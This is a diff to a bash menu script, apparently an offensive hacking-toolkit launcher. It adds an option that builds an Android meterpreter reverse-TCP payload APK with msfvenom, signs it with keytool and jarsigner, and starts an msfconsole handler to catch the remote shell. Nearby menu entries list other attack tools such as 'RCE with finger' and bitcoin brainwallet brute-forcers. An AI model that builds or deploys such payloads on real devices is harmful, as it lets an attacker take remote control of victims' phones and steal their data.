@@ -1077,6 +1077,7 @@ while true; do
 	Stampa " 2337. install a deb package" "2338. install a browser" "2353. Pull a Docker image"
 	Stampa " 2452. AWS S3 copy file to remote host" "2453. AWS S3 list file in remote host" "2454. AWS S3 dump dynamodb tables"
 	Stampa " 2457. install poetry" "2503. run dbg and disassembling a bin file" "751. RCE with finger"
+	Stampa " 2515. Create a Reverse Shell for Android and run a listener"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	Stampa " 511. Isaacdelly/Plutus" "512. dan-v/bruteforce-bitcoin-brainwallet" "513. SMH17/bitcoin-hacking-tools"
@@ -10189,6 +10190,28 @@ while true; do
 	;;
 	"2514")
 		Clona "P1kachu/v0lt"
+	;;
+	"2515")
+		echo "Digit your IP"
+		read -p "(example, 192.168.0.1): " MIP
+		if [[ "$MIP" != "" ]];
+		then
+			echo "Digit your PORT"
+			read -p "(default, 9001): " -i "9001" MPRT
+			if [[ "$MIP" != "" ]];
+			then
+				echo "Digit your alias"
+				read -p "(example, IDONTKNOW): " ALIAS
+				if [[ "$MIP" != "" ]];
+				then
+					msfvenom -p android/meterpreter/reverse_tcp LHOST=$MIP LPORT=$MPRT R > revshell.apk
+					keytool -genkey -V -keystore key.keystore -alias $ALIAS -keyalg RSA -keysize 2048 -validity 10000
+					jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore revshell.apk $ALIAS
+					jarsigner -verify -verbose -certs revshell.apk
+					msfconsole -x "use exploit/multi/handler; set LHOST ""$MIP""; set LPORT ""$MPRT""; set PAYLOAD android/meterpreter/reverse_tcp; run"
+				fi
+			fi
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
